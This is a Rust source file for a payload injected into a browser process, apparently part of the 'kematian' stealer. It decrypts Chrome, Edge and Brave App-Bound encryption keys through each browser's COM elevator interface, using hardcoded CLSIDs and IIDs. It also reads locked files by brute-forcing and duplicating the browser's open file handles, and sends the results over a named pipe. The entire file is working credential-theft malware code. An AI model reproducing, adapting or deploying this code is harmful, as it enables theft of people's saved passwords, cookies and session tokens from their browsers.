//! Injected-payload logic, ported from key_extractor.cpp.
//!
//! On attach the payload reads the pipe name from the `RECOVERY_PIPE`
//! environment variable and spawns a worker thread that services a length-
//! prefixed protocol: `KEY:browser:base64` (App-Bound/v20 key decryption via
//! the browser's COM elevator) and `READ:path` (read a file, transparently
//! duplicating the owning process's open handle on a sharing violation).

use core::ffi::c_void;
use core::ptr;

use crate::abi::{self, GUID};

const MAX_MSG: u32 = 16384;
const MAX_FILE: u32 = 50 * 1024 * 1024; // 50MB
const ENV_BUF: u32 = 512;
const PATH_BUF: usize = 32768;

// ---- OVERLAPPED (x64 layout) ----

#[repr(C)]
#[derive(Clone, Copy)]
struct Overlapped {
    internal: usize,
    internal_high: usize,
    offset: u32,
    offset_high: u32,
    h_event: usize,
}

impl Overlapped {
    fn zeroed() -> Self {
        Overlapped {
            internal: 0,
            internal_high: 0,
            offset: 0,
            offset_high: 0,
            h_event: 0,
        }
    }
}

// ---- base64 decode (standard, padded) ----

fn b64_val(c: u8) -> i32 {
    match c {
        b'A'..=b'Z' => (c - b'A') as i32,
        b'a'..=b'z' => (c - b'a' + 26) as i32,
        b'0'..=b'9' => (c - b'0' + 52) as i32,
        b'+' => 62,
        b'/' => 63,
        _ => -1,
    }
}

fn base64_decode(s: &[u8]) -> Vec<u8> {
    let mut out = Vec::new();
    let mut acc: u32 = 0;
    let mut bits: u32 = 0;
    for &c in s {
        if c == b'=' {
            break;
        }
        let v = b64_val(c);
        if v < 0 {
            continue;
        }
        acc = (acc << 6) | v as u32;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
        }
    }
    out
}

// ---- wide / utf helpers ----

fn utf8_to_wide(bytes: &[u8]) -> Vec<u16> {
    let s = String::from_utf8_lossy(bytes);
    let mut v: Vec<u16> = s.encode_utf16().collect();
    v.push(0);
    v
}

fn ascii_eq_ignore_case(a: &[u8], b: &[u8]) -> bool {
    if a.len() != b.len() {
        return false;
    }
    a.iter().zip(b.iter()).all(|(&x, &y)| x.to_ascii_lowercase() == y.to_ascii_lowercase())
}

/// Case-sensitive wide substring search (matches the C `wcsstr` behavior).
fn wide_contains(haystack: &[u16], needle: &[u16]) -> bool {
    if needle.is_empty() {
        return true;
    }
    if haystack.len() < needle.len() {
        return false;
    }
    (0..=haystack.len() - needle.len()).any(|i| &haystack[i..i + needle.len()] == needle)
}

// ---- pipe helpers ----

unsafe fn pipe_read_exact(h: usize, buf: *mut u8, len: u32) -> bool {
    let mut off = 0u32;
    while off < len {
        let mut rd = 0u32;
        let ok = abi::ReadFile(
            h,
            buf.add(off as usize) as *mut c_void,
            len - off,
            &mut rd,
            ptr::null_mut(),
        );
        if ok == 0 || rd == 0 {
            return false;
        }
        off += rd;
    }
    true
}

unsafe fn pipe_write_all(h: usize, buf: *const u8, len: u32) -> bool {
    let mut off = 0u32;
    while off < len {
        let mut wr = 0u32;
        let ok = abi::WriteFile(
            h,
            buf.add(off as usize) as *const c_void,
            len - off,
            &mut wr,
            ptr::null_mut(),
        );
        if ok == 0 || wr == 0 {
            return false;
        }
        off += wr;
    }
    true
}

unsafe fn send_response(h: usize, status: u8, data: &[u8]) -> bool {
    let total = 1u32 + data.len() as u32;
    let len_bytes = total.to_le_bytes();
    if !pipe_write_all(h, len_bytes.as_ptr(), 4) {
        return false;
    }
    if !pipe_write_all(h, &status as *const u8, 1) {
        return false;
    }
    if !data.is_empty() && !pipe_write_all(h, data.as_ptr(), data.len() as u32) {
        return false;
    }
    abi::FlushFileBuffers(h);
    true
}

// ---- COM elevator (IElevator / IEdgeElevator) ----

// Chrome/Brave: IUnknown + RunRecoveryCRXElevated + EncryptData + DecryptData
#[repr(C)]
struct IElevatorVtbl {
    query_interface: unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> i32,
    add_ref: unsafe extern "system" fn(*mut c_void) -> u32,
    release: unsafe extern "system" fn(*mut c_void) -> u32,
    run_recovery_crx_elevated: unsafe extern "system" fn(
        *mut c_void,
        *const u16,
        *const u16,
        *const u16,
        *const u16,
        u32,
        *mut usize,
    ) -> i32,
    encrypt_data: unsafe extern "system" fn(*mut c_void, u32, *mut u16, *mut *mut u16, *mut u32) -> i32,
    decrypt_data: unsafe extern "system" fn(*mut c_void, *mut u16, *mut *mut u16, *mut u32) -> i32,
}

// Edge: IUnknown + 3 base methods + RunRecoveryCRXElevated + EncryptData + DecryptData
#[repr(C)]
struct IEdgeElevatorVtbl {
    query_interface: unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> i32,
    add_ref: unsafe extern "system" fn(*mut c_void) -> u32,
    release: unsafe extern "system" fn(*mut c_void) -> u32,
    edge_method1: unsafe extern "system" fn(*mut c_void) -> i32,
    edge_method2: unsafe extern "system" fn(*mut c_void) -> i32,
    edge_method3: unsafe extern "system" fn(*mut c_void) -> i32,
    run_recovery_crx_elevated: unsafe extern "system" fn(
        *mut c_void,
        *const u16,
        *const u16,
        *const u16,
        *const u16,
        u32,
        *mut usize,
    ) -> i32,
    encrypt_data: unsafe extern "system" fn(*mut c_void, u32, *mut u16, *mut *mut u16, *mut u32) -> i32,
    decrypt_data: unsafe extern "system" fn(*mut c_void, *mut u16, *mut *mut u16, *mut u32) -> i32,
}

const CLSID_CHROME: GUID = GUID {
    data1: 0x708860E0,
    data2: 0xF641,
    data3: 0x4611,
    data4: [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B],
};
const IID_CHROME: GUID = GUID {
    data1: 0x463ABECF,
    data2: 0x410D,
    data3: 0x407F,
    data4: [0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8],
};
const IID_CHROME2: GUID = GUID {
    data1: 0x1BF5208B,
    data2: 0x295F,
    data3: 0x4992,
    data4: [0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38],
};

const CLSID_EDGE: GUID = GUID {
    data1: 0x1FCBE96C,
    data2: 0x1697,
    data3: 0x43AF,
    data4: [0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67],
};
const IID_EDGE: GUID = GUID {
    data1: 0xC9C2B807,
    data2: 0x7731,
    data3: 0x4F34,
    data4: [0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B],
};
const IID_EDGE2: GUID = GUID {
    data1: 0x8F7B6792,
    data2: 0x784D,
    data3: 0x4047,
    data4: [0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05],
};

const CLSID_BRAVE: GUID = GUID {
    data1: 0x576B31AF,
    data2: 0x6369,
    data3: 0x4B6B,
    data4: [0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B],
};
const IID_BRAVE: GUID = GUID {
    data1: 0xF396861E,
    data2: 0x0C8E,
    data3: 0x4C71,
    data4: [0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9],
};
const IID_BRAVE2: GUID = GUID {
    data1: 0x1BF5208B,
    data2: 0x295F,
    data3: 0x4992,
    data4: [0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38],
};

const COLE_DEFAULT_PRINCIPAL: *mut u16 = usize::MAX as *mut u16;

unsafe fn set_proxy_blanket(ptr: *mut c_void) {
    abi::CoSetProxyBlanket(
        ptr,
        abi::RPC_C_AUTHN_DEFAULT,
        abi::RPC_C_AUTHZ_DEFAULT,
        COLE_DEFAULT_PRINCIPAL,
        abi::RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        abi::RPC_C_IMP_LEVEL_IMPERSONATE,
        ptr::null_mut(),
        abi::EOAC_DYNAMIC_CLOAKING,
    );
}

unsafe fn decrypt_chrome(
    clsid: GUID,
    iid: GUID,
    iid2: GUID,
    bstr: *mut u16,
    out: *mut *mut u16,
    err: *mut u32,
) -> i32 {
    let mut ptr: *mut c_void = ptr::null_mut();
    let mut hr = abi::CoCreateInstance(&clsid, ptr::null_mut(), abi::CLSCTX_LOCAL_SERVER, &iid2, &mut ptr);
    if hr < 0 {
        hr = abi::CoCreateInstance(&clsid, ptr::null_mut(), abi::CLSCTX_LOCAL_SERVER, &iid, &mut ptr);
    }
    if hr < 0 || ptr.is_null() {
        return hr;
    }
    set_proxy_blanket(ptr);
    let vtbl = *(ptr as *const *const IElevatorVtbl);
    hr = ((*vtbl).decrypt_data)(ptr, bstr, out, err);
    ((*vtbl).release)(ptr);
    hr
}

unsafe fn decrypt_edge(bstr: *mut u16, out: *mut *mut u16, err: *mut u32) -> i32 {
    // Try IEdgeElevator2 first, then IEdgeElevator (same vtable layout).
    let mut ptr: *mut c_void = ptr::null_mut();
    let mut hr = abi::CoCreateInstance(
        &CLSID_EDGE,
        ptr::null_mut(),
        abi::CLSCTX_LOCAL_SERVER,
        &IID_EDGE2,
        &mut ptr,
    );
    if hr >= 0 && !ptr.is_null() {
        set_proxy_blanket(ptr);
        let vtbl = *(ptr as *const *const IEdgeElevatorVtbl);
        hr = ((*vtbl).decrypt_data)(ptr, bstr, out, err);
        ((*vtbl).release)(ptr);
        if hr >= 0 && !(*out).is_null() {
            return hr;
        }
    }

    ptr = ptr::null_mut();
    hr = abi::CoCreateInstance(
        &CLSID_EDGE,
        ptr::null_mut(),
        abi::CLSCTX_LOCAL_SERVER,
        &IID_EDGE,
        &mut ptr,
    );
    if hr < 0 || ptr.is_null() {
        return hr;
    }
    set_proxy_blanket(ptr);
    let vtbl = *(ptr as *const *const IEdgeElevatorVtbl);
    hr = ((*vtbl).decrypt_data)(ptr, bstr, out, err);
    ((*vtbl).release)(ptr);
    hr
}

fn decrypt_via_elevator(enc: &[u8], browser: &[u8]) -> Option<Vec<u8>> {
    unsafe {
        let hr = abi::CoInitializeEx(ptr::null_mut(), abi::COINIT_APARTMENTTHREADED);
        if hr < 0 && hr != abi::RPC_E_CHANGED_MODE {
            return None;
        }

        let bstr_enc = abi::SysAllocStringByteLen(enc.as_ptr(), enc.len() as u32);
        if bstr_enc.is_null() {
            abi::CoUninitialize();
            return None;
        }

        let mut bstr_plain: *mut u16 = ptr::null_mut();
        let mut com_err: u32 = 0;

        let hr2 = if ascii_eq_ignore_case(browser, b"edge") {
            decrypt_edge(bstr_enc, &mut bstr_plain, &mut com_err)
        } else if ascii_eq_ignore_case(browser, b"brave") {
            decrypt_chrome(CLSID_BRAVE, IID_BRAVE, IID_BRAVE2, bstr_enc, &mut bstr_plain, &mut com_err)
        } else {
            decrypt_chrome(CLSID_CHROME, IID_CHROME, IID_CHROME2, bstr_enc, &mut bstr_plain, &mut com_err)
        };

        abi::SysFreeString(bstr_enc);

        let result = if hr2 >= 0 && !bstr_plain.is_null() {
            let len = abi::SysStringByteLen(bstr_plain);
            if len > 0 && len <= 64 {
                let mut key = vec![0u8; len as usize];
                ptr::copy_nonoverlapping(bstr_plain as *const u8, key.as_mut_ptr(), len as usize);
                Some(key)
            } else {
                None
            }
        } else {
            None
        };

        if !bstr_plain.is_null() {
            abi::SysFreeString(bstr_plain);
        }
        abi::CoUninitialize();
        result
    }
}

// ---- READ handler ----

/// Brute-force the owning process's open file handle by walking handle values
/// and matching the DOS path (ported from `find_open_handle`).
unsafe fn find_open_handle(target_path: &[u16]) -> usize {
    let mut sep_count = 0;
    let mut suffix_start = 0usize;
    let mut i = target_path.len();
    while i > 0 && sep_count < 2 {
        i -= 1;
        if target_path[i] == b'\\' as u16 {
            sep_count += 1;
            if sep_count == 2 {
                suffix_start = i;
            }
        }
    }
    let suffix = &target_path[suffix_start..];

    let mut h = 4usize;
    while h < 0x10000 {
        if abi::GetFileType(h) == abi::FILE_TYPE_DISK {
            let mut name = [0u16; PATH_BUF];
            let len = abi::GetFinalPathNameByHandleW(h, name.as_mut_ptr(), PATH_BUF as u32, 0);
            if len > 0 && (len as usize) < PATH_BUF {
                let slice = &name[..len as usize];
                if wide_contains(slice, suffix) {
                    let mut dup = 0usize;
                    if abi::DuplicateHandle(
                        abi::GetCurrentProcess(),
                        h,
                        abi::GetCurrentProcess(),
                        &mut dup,
                        0,
                        0,
                        abi::DUPLICATE_SAME_ACCESS,
                    ) != 0
                    {
                        return dup;
                    }
                }
            }
        }
        h += 4;
    }
    abi::INVALID_HANDLE_VALUE
}

unsafe fn handle_read(h: usize, utf8path: &[u8]) {
    let wide = utf8_to_wide(utf8path);
    let mut hfile = abi::CreateFileW(
        wide.as_ptr(),
        abi::GENERIC_READ,
        abi::FILE_SHARE_READ | abi::FILE_SHARE_WRITE | abi::FILE_SHARE_DELETE,
        ptr::null_mut(),
        abi::OPEN_EXISTING,
        abi::FILE_ATTRIBUTE_NORMAL,
        0,
    );

    let mut via_dup = false;
    if hfile == abi::INVALID_HANDLE_VALUE && abi::GetLastError() == abi::ERROR_SHARING_VIOLATION {
        hfile = find_open_handle(&wide[..wide.len() - 1]);
        via_dup = true;
    }

    if hfile == abi::INVALID_HANDLE_VALUE {
        send_response(h, 1, b"open failed");
        return;
    }

    let size = abi::GetFileSize(hfile, ptr::null_mut());
    if size == abi::INVALID_FILE_SIZE || size > MAX_FILE {
        abi::CloseHandle(hfile);
        send_response(h, 1, b"bad size");
        return;
    }

    let mut data = vec![0u8; size as usize];
    let mut rd = 0u32;
    let ok = if via_dup {
        let mut ov = Overlapped::zeroed();
        abi::ReadFile(hfile, data.as_mut_ptr() as *mut c_void, size, &mut rd, &mut ov as *mut Overlapped as *mut c_void) != 0
            && rd == size
    } else {
        abi::ReadFile(hfile, data.as_mut_ptr() as *mut c_void, size, &mut rd, ptr::null_mut()) != 0
            && rd == size
    };
    abi::CloseHandle(hfile);

    if ok {
        send_response(h, 0, &data);
    } else if via_dup {
        send_response(h, 1, b"dup read fail");
    } else {
        send_response(h, 1, b"read fail");
    }
}

// ---- KEY handler ----

unsafe fn handle_key(h: usize, args: &[u8]) {
    let Some(pos) = args.iter().position(|&c| c == b':') else {
        send_response(h, 1, b"bad format");
        return;
    };
    let (browser, b64) = args.split_at(pos);
    let enc = base64_decode(&b64[1..]);
    if enc.len() < 5 {
        send_response(h, 1, b"small key");
        return;
    }
    match decrypt_via_elevator(&enc, browser) {
        Some(key) => {
            send_response(h, 0, &key);
        }
        None => {
            send_response(h, 1, b"decrypt failed");
        }
    }
}

// ---- worker thread ----

unsafe fn worker(pipe: &[u16]) -> u32 {
    let h = abi::CreateFileW(
        pipe.as_ptr(),
        abi::GENERIC_READ | abi::GENERIC_WRITE,
        0,
        ptr::null_mut(),
        abi::OPEN_EXISTING,
        0,
        0,
    );
    if h == abi::INVALID_HANDLE_VALUE {
        return 1;
    }

    loop {
        let mut msg_len: u32 = 0;
        if !pipe_read_exact(h, &mut msg_len as *mut u32 as *mut u8, 4)
            || msg_len == 0
            || msg_len > MAX_MSG
        {
            break;
        }
        let mut msg = vec![0u8; msg_len as usize];
        if !pipe_read_exact(h, msg.as_mut_ptr(), msg_len) {
            break;
        }

        if msg.len() >= 4 && &msg[..4] == b"KEY:" {
            handle_key(h, &msg[4..]);
        } else if msg.len() >= 5 && &msg[..5] == b"READ:" {
            handle_read(h, &msg[5..]);
        } else if msg.len() >= 4 && &msg[..4] == b"EXIT" {
            break;
        } else {
            send_response(h, 1, b"unknown");
        }
    }

    abi::CloseHandle(h);
    0
}

fn read_env_wide(name: &str) -> Option<Vec<u16>> {
    let mut name_w: Vec<u16> = name.encode_utf16().collect();
    name_w.push(0);
    let mut buf = vec![0u16; ENV_BUF as usize];
    unsafe {
        let len = abi::GetEnvironmentVariableW(name_w.as_ptr(), buf.as_mut_ptr(), ENV_BUF);
        if len == 0 || len >= ENV_BUF {
            return None;
        }
        buf.truncate(len as usize);
        Some(buf)
    }
}

pub fn on_attach() {
    if let Some(pipe) = read_env_wide("RECOVERY_PIPE") {
        let mut p = pipe;
        p.push(0);
        let _ = std::thread::Builder::new()
            .name("kematian-extractor".to_string())
            .spawn(move || unsafe {
                worker(&p);
            });
    }
}
